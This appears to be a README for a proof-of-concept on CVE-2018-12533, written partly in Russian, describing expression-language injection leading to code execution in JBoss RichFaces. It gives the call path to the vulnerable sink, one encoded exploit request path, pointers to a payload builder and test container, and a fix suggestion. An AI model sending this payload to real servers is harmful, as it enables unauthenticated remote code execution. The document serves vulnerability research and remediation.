### CVE
Package: org.richfaces:richfaces-core

Affected versions: >= 3.1.0, <= 3.3.4

Patched versions: None [не исправлено]

JBoss RichFaces 3.1.0 through 3.3.4 allows unauthenticated remote attackers to inject expression language (EL) expressions and execute arbitrary Java code via a /DATA/ substring in a path with an org.richfaces.renderkit.html.Paint2DResource$ImageData object

Arbitrary code execution

Передавая в path http запроса сериализованный объект типа ```org.richfaces.renderkit.html.Paint2DResource$ImageData``` можно добиться выполнения произвольного java кода. Сгенерировать нужный path можно запустив программу из директории `CVE-2018-12533-poc-path-param-builder`


### Stack trace до sink
```LocalWebConnection.getResponse(WebRequestSettings settings)```

```StagingConnection.execute()```

```FilterContainer.execute(ServletRequest request, ServletResponse response)```

```BaseFilter.doFilter(ServletRequest request, ServletResponse response,FilterChain chain)```

```InternetResourceService.serviceResource(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse)```

```InternetResourceService.serviceResource(String resourceKey, HttpServletRequest request, HttpServletResponse response)```

```ResourceLifecycle.send(ResourceContext resourceContext, InternetResource resource)```

```ResourceLifecycle.sendResource(ResourceContext resourceContext, InternetResource resource)```

```Paint2DResource.send(ResourceContext context)```


Sink:
Paint2DResource.send
[code link](https://github.com/BrentDouglas/richfaces-3/blob/9993471d966be8907de3c0de51bb726caaf587cc/ui/paint2D/src/main/java/org/richfaces/renderkit/html/Paint2DResource.java#L187)

### POC

В директории `CVE-2018-12533-poc-path-param-builder` представлена программа, которая генерирует http request path для исполнения требуемого java кода.

Пример такого path:
`org.richfaces.renderkit.html.Paint2DResource/DATA/eAHNUs9rE0EUngRq1XqoP1BEhLqKplAmaaoi1ICYigY2VhoRrIcw2bzuTjs7s52dTVaL3kSw4MWriOBJUBD9C7xJwUv-BBHEgyCCeNQ3u7XBgnf3so-Zb77ve997L7-SkViTs0r7VHMvWGIexFSD7IJe4YYGJhT0GuPSVOcWIFaJ9uBEI2Q-zDHDau8HH8d!vXhdJKMNsrPd8etKKN0go-0lpUNmbBUA9wOsdrT7vGuCRbLLY14ArCPAJSPtLtIYss9dZj1WFkz65fnOMnhm1sUXkRVeJfdIIY1I!hXxlxJSmCIR-j5pn6U0d-2pMFISpKEt5IQrSmATLdYDfXPjbe3xkw!NIim6qC9YHF9lIfyt2zKaSx91d8f4pptxGHIwd8ZVuQWaM8HvWOezaWTlT6EkjROZGRBgYgqCuuAz73YTTKC6F7nsIumm90KRFFxSCA05krGmZRDlHHgpjTTEMVcSqf!FfJ3529F!mPdgKpoczuNAE9txb8ob659-nn6E8SFu!xZuqPv8!sPW98XBeYuwDo7ZlVjuqDhrajtfI4xE59uhH2Pv9jatth3SWH-dPDi-pmE1gdhQH0zdJl2a3CpdxXAkeCCwyC8da4XawdOFRBoegpPhc8GSgyzDcy57agVKMhFikkIKXskxKvGCCa8H7Wpl-lx7unpmZsaZvEtIgm3eymLO2TfH-2pw4!OXo2uXszYxvaIhBzILXNH5xESJQSAwnNH40Fm-klGU9p-RpxMXKlOViZrjIcxAXUmDK1f7T!p20t8n90wr`


Также там есть Dockerfile с помощью которого можно сбилдить контейнер внутри которого будет работать web приложение к которому необходимо делать http запросы содержащие payload.


### Fix
Возможные фиксы:
- Выполнение java кода происходит при интерполяции исполняемого выражения из строки с использованием библиотеки  JBoss EL. Эта библиотека поддерживает задание context для исполнения, содержащего заранее определенное множество переменных, к которым можно обращаться в исполняемом выражении. Поэтому в качестве фикса могу предложить в случае когда Paint2DResource приходит из пользовательского ввода ограничивать context.

